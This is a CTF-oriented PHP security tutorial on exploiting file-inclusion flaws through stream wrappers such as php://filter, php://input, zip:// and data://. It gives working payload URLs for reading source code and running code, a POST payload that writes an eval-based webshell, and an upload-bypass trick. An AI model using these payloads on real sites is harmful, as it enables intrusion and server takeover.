# PHP Safe Learning—Pseudo-Protocol

Author: H3rmesk1t

Data: 2020.11.29

# Preface
Common files include functions: include, require, include_once, require_once, highlight_file, show_source, readfile, file_get_contents, fopen, file


#Configuration
PHP.ini:
allow_url_fopen : on is enabled by default. This option is on, which activates the URL-form fopen encapsulation protocol to enable access to URL object files, etc.
allow_url_include: off is turned off by default. This option is on, which allows URL object files, etc.
The PHP version used in this test is >=5.2, specifically 5.2, 5.3, 5.5, 7.0; the PHP version <=5.2 can be truncated using %00.

# Issue of truncation
This article is discussed with the following simple example. First, look at the following two files inclusion situations.

Situation 1: No truncation is required:
```php
http://127.0.0.1/test.php?file=file:///c:/users/ctf/desktop/flag.txt

<?php

include($_GET['file'])

?>
```

Situation 2: Need to be cut off:

```php
Testing in php version <=5.2 can be truncated using %00.

http://127.0.0.1/test.php?file=file:///c:/users/ctf/desktop/flag.txt%00

<?php

include($_GET['file'].'.php')

?>
```

**0x02 Question about whether allow_url_fopen and allow_url_include are enabled: **

# file://protocol

PHP.ini:
file:// The protocol can also be used normally under double off;
allow_url_fopen : off/on
allow_url_include: off/on

file:// is used to access the local file system, usually used in CTF to read local files and is not affected by allow_url_fopen and allow_url_include
[Reference link](http://php.net/manual/zh/wrappers.file.php)

How to use:
file:// [Absolute path and file name of the file]
http://127.0.0.1/cmd.php?file=file://D:/ctf/phpStudy/WWW/flag.txt

# php://protocol

condition:
You do not need to enable allow_url_fopen, only allow_url_include is required for php://input, php://stdin, php://memory and php://temp.

php:// accesses various input/output streams (I/O streams). In CTF, php://filter and php://input are often used. php://filter is used to read the source code, and php://input is used to execute the php code.
[Reference link](http://php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq)
php://filter reads the source code and performs base64 encoding output, otherwise it will be directly executed as php code and will not see the source code content.
[Reference link](https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1)

PHP.ini:
php://filter can also be used normally under double off;
allow_url_fopen : off/on
allow_url_include: off/on
```bash
http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php
```
php://input can access the read-only stream of the requested original data and execute the data in the post request as PHP code.

PHP.ini:
allow_url_fopen : off/on
allow_url_include: on

Test phenomenon:

```php
http://127.0.0.1/cmd.php?file=php://input

[POST DATA] <?php phpinfo()?>

You can also POST the following content to generate a sentence: <?php fputs(fopen("shell.php","w"),'<?php eval($_POST["cmd"];?>');?>
```

# zip://, bzip2://, zlib:// protocol

PHP.ini:
zip://, bzip2://, zlib:// protocol can also be used normally under double off;
allow_url_fopen : off/on
allow_url_include: off/on
zip://, bzip2://, zlib:// are all compression streams, and can access subfiles in compressed files. More importantly, there is no need to specify a suffix name.
[Reference link](http://php.net/manual/zh/wrappers.compression.php)

【zip://Agreement】

How to use:

```php
zip://archive.zip#dir/file.txt

zip:// [Absolute path of compressed file]# [Subfile name in compressed file]

Test phenomenon:

http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt

First write the PHP code to be executed with the file name phpcode.txt, zip compress phpcode.txt, and the compressed file name is file.zip. If you can upload the zip file, you will upload it directly. If you cannot, rename file.zip to file.jpg and upload it. This can also be done in several other compression formats.
Since '#' will ignore the following parameters in the get request, the url encoding should be performed as %23 when using the get request, and the relative path is not feasible here after testing, so only absolute paths can be used.

Compress phpinfo.txt into zip. In actual combat, you can change the suffix to jpg to bypass upload restrictions.

http://192.168.43.173:8999/lsawebtest/phptest/phprotocol1.php?file=zip://C:/phpStudy/PHPTutorial/WWW/lsawebtest/phptest\phpinfo.jpg%23phpinfo.txt

Note that you need to use absolute path + url encoding#
```
【bzip2://protocol】

How to use:

```php
compress.bzip2://file.bz2

Test phenomenon:

http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg

http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg
```

【zlib://protocol】

How to use:

```php
compress.zlib://file.gz

Test phenomenon:

http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg

or

http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg
```

# data://protocol

data:// is the protocol limited by allow_url_fopen

PHP.ini:
data://protocol must be double-on to be used normally;
allow_url_fopen :on
allow_url_include: on

[Reference link](http://php.net/manual/zh/wrappers.data.php)
In the official document, allow_url_fopen should be yes.

Test phenomenon:

```bash
http://127.0.0.1/cmd.php?file=data://text/plain,<?php phpinfo()?>

http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

Also:

http://127.0.0.1/cmd.php?file=data:text/plain,<?php phpinfo()?>

http://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

Here is a picture:
![Insert the picture description here](https://img-blog.csdnimg.cn/img_convert/536e6294ecad380a85aa925b01e500ba.png#pic_center)
**Reference: **
[Information 1](https://www.freebuf.com/column/148886.html)
[Information 2](http://php.net/manual/zh/wrap
Pierce.PHP)